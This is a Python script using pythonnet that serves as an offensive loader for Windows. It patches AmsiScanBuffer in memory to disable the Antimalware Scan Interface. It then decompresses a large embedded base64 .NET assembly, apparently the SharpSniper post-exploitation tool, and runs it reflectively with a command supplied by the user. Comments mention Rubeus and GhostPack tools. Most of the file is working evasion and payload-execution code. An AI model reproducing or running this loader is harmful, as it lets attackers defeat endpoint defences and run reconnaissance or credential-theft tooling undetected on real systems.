import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpSniper.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()